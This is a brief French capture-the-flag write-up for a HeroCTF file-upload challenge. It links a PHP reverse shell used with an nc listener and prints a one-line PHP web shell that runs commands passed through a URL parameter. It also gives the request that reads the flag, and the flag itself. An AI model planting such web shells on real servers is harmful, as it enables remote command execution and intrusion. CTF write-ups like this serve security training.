Ce challenge nous invite fortement à upload de quoi obtenir un shell.

Il existe 2 techniques pour celui-ci :

- Upload d'un reverse shell php (comme celui se trouvant ici : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) et accès au shell via un `nc -lvp <port>`

- Upload d'un très court script php :
```php
<?php
  print_r(shell_exec($_GET['cmd']));
?>
```
On peut ensuite se balader dans l'arborescence via le paramètre `?cmd=` jusqu'à trouver le `flag.txt` dans le dossier `/dossiersupersecret`. On l'affiche donc simplement : `http://heroctf.fr:6200/tmp/shell.php?cmd=cat+/dossiersupersecret/flag.txt`

HeroCTF{4dm1n_sh0uld_ch3ck_th3_ext3ens1on}
